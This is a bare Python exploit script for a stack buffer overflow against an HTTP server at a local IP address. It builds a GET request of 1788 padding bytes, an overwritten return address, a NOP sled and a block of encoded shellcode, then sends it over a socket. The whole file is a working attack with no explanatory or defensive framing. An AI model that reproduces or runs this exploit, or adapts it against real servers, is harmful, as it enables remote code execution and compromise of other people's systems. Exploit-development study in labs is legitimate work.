import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('192.168.1.9',80))

buf = "GET"

buf += "A"*1788 + "\x5b\x4e\xd3\x77"

buf += "\x90" * 10

buf += b""
buf += b"\xbf\xf6\xb0\x77\xf1\xda\xc9\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\x8c\xbe\x95"
buf += b"\x04\x8c\x57\xdb\xe7\x6c\xa8\xbc\x6e\x89\x99\xfc\x15"
buf += b"\xda\x8a\xcc\x5e\x8e\x26\xa6\x33\x3a\xbc\xca\x9b\x4d"
buf += b"\x75\x60\xfa\x60\x86\xd9\x3e\xe3\x04\x20\x13\xc3\x35"
buf += b"\xeb\x66\x02\x71\x16\x8a\x56\x2a\x5c\x39\x46\x5f\x28"
buf += b"\x82\xed\x13\xbc\x82\x12\xe3\xbf\xa3\x85\x7f\xe6\x63"
buf += b"\x24\x53\x92\x2d\x3e\xb0\x9f\xe4\xb5\x02\x6b\xf7\x1f"
buf += b"\x5b\x94\x54\x5e\x53\x67\xa4\xa7\x54\x98\xd3\xd1\xa6"
buf += b"\x25\xe4\x26\xd4\xf1\x61\xbc\x7e\x71\xd1\x18\x7e\x56"
buf += b"\x84\xeb\x8c\x13\xc2\xb3\x90\xa2\x07\xc8\xad\x2f\xa6"
buf += b"\x1e\x24\x6b\x8d\xba\x6c\x2f\xac\x9b\xc8\x9e\xd1\xfb"
buf += b"\xb2\x7f\x74\x70\x5e\x6b\x05\xdb\x37\x58\x24\xe3\xc7"
buf += b"\xf6\x3f\x90\xf5\x59\x94\x3e\xb6\x12\x32\xb9\xb9\x08"
buf += b"\x82\x55\x44\xb3\xf3\x7c\x83\xe7\xa3\x16\x22\x88\x2f"                   
buf += b"\xe6\xcb\x5d\xff\xb6\x63\x0e\x40\x66\xc4\xfe\x28\x6c"                   
buf += b"\xcb\x21\x48\x8f\x01\x4a\xe3\x6a\xc2\xb5\x5c\x75\x18"                   
buf += b"\x5e\x9f\x75\x18\x4c\x16\x93\x4a\x60\x7f\x0c\xe3\x19"                   
buf += b"\xda\xc6\x92\xe6\xf0\xa3\x95\x6d\xf7\x54\x5b\x86\x72"                   
buf += b"\x46\x0c\x66\xc9\x34\x9b\x79\xe7\x50\x47\xeb\x6c\xa0"                   
buf += b"\x0e\x10\x3b\xf7\x47\xe6\x32\x9d\x75\x51\xed\x83\x87"                   
buf += b"\x07\xd6\x07\x5c\xf4\xd9\x86\x11\x40\xfe\x98\xef\x49"                   
buf += b"\xba\xcc\xbf\x1f\x14\xba\x79\xf6\xd6\x14\xd0\xa5\xb0"                   
buf += b"\xf0\xa5\x85\x02\x86\xa9\xc3\xf4\x66\x1b\xba\x40\x99"                   
buf += b"\x94\x2a\x45\xe2\xc8\xca\xaa\x39\x49\xfa\xe0\x63\xf8"                   
buf += b"\x93\xac\xf6\xb8\xf9\x4e\x2d\xfe\x07\xcd\xc7\x7f\xfc"
buf += b"\xcd\xa2\x7a\xb8\x49\x5f\xf7\xd1\x3f\x5f\xa4\xd2\x15"


buf += "HTTP/1.1\r\n\r\n"

sock.send(buf)

sock.close()

#sys.argv[1]
